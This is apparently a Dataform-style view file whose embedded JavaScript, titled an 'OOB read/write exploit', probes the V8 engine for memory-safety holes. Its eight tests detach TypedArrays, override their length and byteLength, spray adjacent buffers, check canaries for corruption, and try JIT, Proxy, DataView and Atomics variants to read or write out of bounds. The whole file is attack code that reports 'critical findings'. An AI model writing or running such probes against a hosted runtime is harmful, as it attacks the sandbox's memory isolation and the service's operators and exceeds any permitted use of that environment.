config { type: "view", name: "v8_oob_length_exploit" }

js {
  let results = {
    probeTime: new Date().toISOString(),
    purpose: "OOB read/write exploit via detached TypedArray length override"
  };

  // =============================================================================
  // SETUP: Create adjacent buffers for heap spray pattern
  // =============================================================================
  results.setup = {};
  try {
    // Create many buffers to increase chance of adjacent allocation
    const buffers = [];
    const views = [];
    const BUFFER_SIZE = 64;
    const BUFFER_COUNT = 100;

    for (let i = 0; i < BUFFER_COUNT; i++) {
      const buf = new ArrayBuffer(BUFFER_SIZE);
      const view = new Uint8Array(buf);
      // Fill with pattern to detect OOB reads
      for (let j = 0; j < BUFFER_SIZE; j++) {
        view[j] = (i * 256 + j) & 0xFF;
      }
      buffers.push(buf);
      views.push(view);
    }

    results.setup = {
      status: "completed",
      bufferCount: buffers.length,
      bufferSize: BUFFER_SIZE
    };
  } catch(e) {
    results.setup = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 1: Basic OOB Read via Length Override
  // =============================================================================
  results.test1_oobRead = {};
  try {
    // Create target buffer
    const targetBuf = new ArrayBuffer(32);
    const targetView = new Uint8Array(targetBuf);

    // Fill with known pattern
    for (let i = 0; i < 32; i++) {
      targetView[i] = 0xAA;
    }

    // Create adjacent "victim" buffer with secret data
    const victimBuf = new ArrayBuffer(64);
    const victimView = new Uint8Array(victimBuf);
    for (let i = 0; i < 64; i++) {
      victimView[i] = 0xBB;
    }

    // Transfer target buffer (detach targetView)
    const newBuf = targetBuf.transfer();

    // Override length to much larger value
    let overrideSuccess = false;
    try {
      Object.defineProperty(targetView, 'length', {
        value: 1024,
        writable: true,
        configurable: true
      });
      overrideSuccess = true;
    } catch(e) {
      overrideSuccess = false;
    }

    // Attempt OOB reads
    const oobReads = [];
    const readErrors = [];

    for (let offset of [0, 16, 32, 48, 64, 128, 256, 512]) {
      try {
        const val = targetView[offset];
        oobReads.push({ offset, value: val, hex: val !== undefined ? val.toString(16) : "undefined" });
      } catch(e) {
        readErrors.push({ offset, error: e.message.substring(0, 50) });
      }
    }

    results.test1_oobRead = {
      status: "completed",
      overrideSuccess,
      reportedLength: targetView.length,
      actualByteLength: targetBuf.byteLength,
      newBufByteLength: newBuf.byteLength,
      oobReads,
      readErrors: readErrors.length > 0 ? readErrors : "none"
    };
  } catch(e) {
    results.test1_oobRead = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 2: OOB Write via Length Override
  // =============================================================================
  results.test2_oobWrite = {};
  try {
    // Create buffers that might be adjacent in memory
    const buf1 = new ArrayBuffer(32);
    const view1 = new Uint8Array(buf1);

    // Canary buffer - if we can write here, we have OOB write
    const canaryBuf = new ArrayBuffer(32);
    const canaryView = new Uint8Array(canaryBuf);
    for (let i = 0; i < 32; i++) {
      canaryView[i] = 0xCC;  // Known pattern
    }

    const buf3 = new ArrayBuffer(32);
    const view3 = new Uint8Array(buf3);

    // Record canary before
    const canaryBefore = Array.from(canaryView.slice(0, 8));

    // Detach view1
    const newBuf1 = buf1.transfer();

    // Override length
    Object.defineProperty(view1, 'length', {
      value: 4096,
      writable: true,
      configurable: true
    });

    // Attempt OOB writes
    const writeResults = [];
    for (let offset of [32, 48, 64, 96, 128]) {
      try {
        view1[offset] = 0xDD;
        writeResults.push({ offset, written: true });
      } catch(e) {
        writeResults.push({ offset, written: false, error: e.message.substring(0, 30) });
      }
    }

    // Check if canary was corrupted
    const canaryAfter = Array.from(canaryView.slice(0, 8));
    const canaryCorrupted = canaryBefore.some((v, i) => v !== canaryAfter[i]);

    results.test2_oobWrite = {
      status: "completed",
      reportedLength: view1.length,
      writeResults,
      canaryBefore: canaryBefore.map(v => v.toString(16)),
      canaryAfter: canaryAfter.map(v => v.toString(16)),
      canaryCorrupted
    };
  } catch(e) {
    results.test2_oobWrite = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 3: Length Override with Different TypedArray Types
  // =============================================================================
  results.test3_typedArrayTypes = {};
  try {
    const typeResults = {};

    const types = [
      { name: "Uint8Array", ctor: Uint8Array },
      { name: "Int32Array", ctor: Int32Array },
      { name: "Float64Array", ctor: Float64Array },
      { name: "BigInt64Array", ctor: BigInt64Array }
    ];

    for (const { name, ctor } of types) {
      try {
        const buf = new ArrayBuffer(64);
        const view = new ctor(buf);
        const originalLength = view.length;

        const newBuf = buf.transfer();

        // Try override
        let overrideWorked = false;
        try {
          Object.defineProperty(view, 'length', { value: 10000 });
          overrideWorked = view.length === 10000;
        } catch(e) {}

        // Try OOB read
        let oobReadValue = null;
        let oobReadError = null;
        try {
          oobReadValue = view[originalLength + 10];
        } catch(e) {
          oobReadError = e.message.substring(0, 50);
        }

        typeResults[name] = {
          originalLength,
          overrideWorked,
          reportedLength: view.length,
          oobReadValue: oobReadValue !== undefined ? String(oobReadValue) : "undefined",
          oobReadError
        };
      } catch(e) {
        typeResults[name] = { error: e.message.substring(0, 100) };
      }
    }

    results.test3_typedArrayTypes = {
      status: "completed",
      typeResults
    };
  } catch(e) {
    results.test3_typedArrayTypes = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 4: Hot Loop OOB Access (JIT Optimized)
  // =============================================================================
  results.test4_jitOob = {};
  try {
    function readAtIndex(view, idx) {
      return view[idx];
    }

    function writeAtIndex(view, idx, val) {
      view[idx] = val;
    }

    // Create normal array for warmup
    const normalBuf = new ArrayBuffer(256);
    const normalView = new Uint8Array(normalBuf);
    for (let i = 0; i < 256; i++) {
      normalView[i] = i;
    }

    // JIT warmup with normal array
    for (let i = 0; i < 100000; i++) {
      readAtIndex(normalView, i % 256);
      writeAtIndex(normalView, i % 256, i & 0xFF);
    }

    // Now create detached array with overridden length
    const targetBuf = new ArrayBuffer(64);
    const targetView = new Uint8Array(targetBuf);
    for (let i = 0; i < 64; i++) {
      targetView[i] = 0xEE;
    }

    const newBuf = targetBuf.transfer();
    Object.defineProperty(targetView, 'length', { value: 4096 });

    // Try OOB access through JIT-optimized function
    const jitOobReads = [];
    const jitOobWrites = [];

    for (let offset of [64, 128, 256, 512, 1024, 2048]) {
      try {
        const readVal = readAtIndex(targetView, offset);
        jitOobReads.push({ offset, value: readVal !== undefined ? readVal.toString(16) : "undefined" });
      } catch(e) {
        jitOobReads.push({ offset, error: e.message.substring(0, 30) });
      }

      try {
        writeAtIndex(targetView, offset, 0xFF);
        jitOobWrites.push({ offset, success: true });
      } catch(e) {
        jitOobWrites.push({ offset, success: false });
      }
    }

    results.test4_jitOob = {
      status: "completed",
      reportedLength: targetView.length,
      jitOobReads,
      jitOobWrites
    };
  } catch(e) {
    results.test4_jitOob = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 5: ByteLength vs Length Mismatch Exploitation
  // =============================================================================
  results.test5_byteLengthMismatch = {};
  try {
    const buf = new ArrayBuffer(64);
    const view = new Float64Array(buf);  // 8 Float64 elements

    // Fill with identifiable pattern
    for (let i = 0; i < 8; i++) {
      view[i] = i + 0.5;
    }

    const originalLength = view.length;
    const originalByteLength = view.byteLength;

    // Transfer and override
    const newBuf = buf.transfer();

    // Override length to imply more bytes than buffer had
    Object.defineProperty(view, 'length', { value: 1000 });

    // Also try to override byteLength
    let byteLengthOverride = "not attempted";
    try {
      Object.defineProperty(view, 'byteLength', { value: 8000 });
      byteLengthOverride = "succeeded: " + view.byteLength;
    } catch(e) {
      byteLengthOverride = "failed: " + e.message.substring(0, 50);
    }

    // Check buffer/view relationship
    let bufferStillConnected = false;
    try {
      bufferStillConnected = view.buffer === buf;
    } catch(e) {}

    // Try reading through overridden view
    const readResults = [];
    for (let idx of [0, 8, 16, 50, 100]) {
      try {
        const val = view[idx];
        readResults.push({
          idx,
          value: val !== undefined ? (typeof val === 'bigint' ? val.toString() : val) : "undefined",
          type: typeof val
        });
      } catch(e) {
        readResults.push({ idx, error: e.message.substring(0, 50) });
      }
    }

    results.test5_byteLengthMismatch = {
      status: "completed",
      originalLength,
      originalByteLength,
      overriddenLength: view.length,
      byteLengthOverride,
      bufferStillConnected,
      detachedBufferByteLength: buf.byteLength,
      newBufferByteLength: newBuf.byteLength,
      readResults
    };
  } catch(e) {
    results.test5_byteLengthMismatch = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 6: Proxy-wrapped TypedArray OOB
  // =============================================================================
  results.test6_proxyOob = {};
  try {
    const buf = new ArrayBuffer(32);
    const view = new Uint8Array(buf);
    for (let i = 0; i < 32; i++) {
      view[i] = i;
    }

    // Create proxy with length trap
    let getTrapCalls = [];
    const proxiedView = new Proxy(view, {
      get(target, prop, receiver) {
        getTrapCalls.push(String(prop));
        if (prop === 'length') {
          return 4096;  // Lie about length
        }
        return Reflect.get(target, prop, receiver);
      }
    });

    // Transfer original buffer
    const newBuf = buf.transfer();

    // Access through proxy
    const proxyReads = [];
    for (let idx of [0, 16, 32, 64, 128]) {
      try {
        const val = proxiedView[idx];
        proxyReads.push({ idx, value: val !== undefined ? val.toString(16) : "undefined" });
      } catch(e) {
        proxyReads.push({ idx, error: e.message.substring(0, 50) });
      }
    }

    results.test6_proxyOob = {
      status: "completed",
      proxiedLength: proxiedView.length,
      actualLength: view.length,
      getTrapCalls: getTrapCalls.slice(0, 20),
      proxyReads
    };
  } catch(e) {
    results.test6_proxyOob = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 7: DataView on Detached Buffer with Property Override
  // =============================================================================
  results.test7_dataViewDetached = {};
  try {
    const buf = new ArrayBuffer(64);
    const dv = new DataView(buf);

    // Write some data
    dv.setUint32(0, 0xDEADBEEF, true);
    dv.setUint32(4, 0xCAFEBABE, true);

    const originalByteLength = dv.byteLength;

    // Transfer
    const newBuf = buf.transfer();

    // Try to override byteLength
    let byteLengthOverride = "not attempted";
    try {
      Object.defineProperty(dv, 'byteLength', { value: 4096 });
      byteLengthOverride = "succeeded: " + dv.byteLength;
    } catch(e) {
      byteLengthOverride = "failed: " + e.message.substring(0, 50);
    }

    // Try DataView operations on detached buffer
    const dvOps = [];

    try {
      const val = dv.getUint32(0, true);
      dvOps.push({ op: "getUint32(0)", result: val.toString(16) });
    } catch(e) {
      dvOps.push({ op: "getUint32(0)", error: e.message.substring(0, 50) });
    }

    try {
      dv.setUint32(64, 0x41414141, true);
      dvOps.push({ op: "setUint32(64)", result: "no error" });
    } catch(e) {
      dvOps.push({ op: "setUint32(64)", error: e.message.substring(0, 50) });
    }

    try {
      const val = dv.getUint32(128, true);
      dvOps.push({ op: "getUint32(128)", result: val.toString(16) });
    } catch(e) {
      dvOps.push({ op: "getUint32(128)", error: e.message.substring(0, 50) });
    }

    results.test7_dataViewDetached = {
      status: "completed",
      originalByteLength,
      reportedByteLength: dv.byteLength,
      byteLengthOverride,
      dvOps
    };
  } catch(e) {
    results.test7_dataViewDetached = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 8: Atomics on Detached SharedArrayBuffer View
  // =============================================================================
  results.test8_atomicsDetached = {};
  try {
    // SharedArrayBuffer can't be transferred, but let's test similar patterns
    const sab = new SharedArrayBuffer(64);
    const sabView = new Int32Array(sab);

    Atomics.store(sabView, 0, 0x12345678);

    // Try to override length
    let lengthOverride = "not attempted";
    try {
      Object.defineProperty(sabView, 'length', { value: 1000 });
      lengthOverride = "succeeded: " + sabView.length;
    } catch(e) {
      lengthOverride = "failed: " + e.message.substring(0, 50);
    }

    // Try Atomics operations at various offsets
    const atomicOps = [];

    for (let idx of [0, 15, 16, 32, 100]) {
      try {
        const val = Atomics.load(sabView, idx);
        atomicOps.push({ op: `load(${idx})`, result: val.toString(16) });
      } catch(e) {
        atomicOps.push({ op: `load(${idx})`, error: e.message.substring(0, 50) });
      }
    }

    results.test8_atomicsDetached = {
      status: "completed",
      originalLength: 16,  // 64 bytes / 4 bytes per Int32
      lengthOverride,
      reportedLength: sabView.length,
      atomicOps
    };
  } catch(e) {
    results.test8_atomicsDetached = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // SUMMARY
  // =============================================================================
  results.summary = {
    testsRun: 8,
    allCompleted: Object.keys(results).filter(k =>
      k.startsWith("test") && results[k].status === "completed"
    ).length,
    criticalFindings: []
  };

  // Check for critical findings
  if (results.test1_oobRead && results.test1_oobRead.oobReads) {
    const oobSuccess = results.test1_oobRead.oobReads.filter(r =>
      r.value !== undefined && r.value !== "undefined" && r.offset >= 32
    );
    if (oobSuccess.length > 0) {
      results.summary.criticalFindings.push("OOB_READ: Read succeeded beyond buffer bounds");
    }
  }

  if (results.test2_oobWrite && results.test2_oobWrite.canaryCorrupted) {
    results.summary.criticalFindings.push("OOB_WRITE: Adjacent memory corrupted");
  }
}

SELECT '${JSON.stringify(results, null, 2)}' as oob_length_exploit
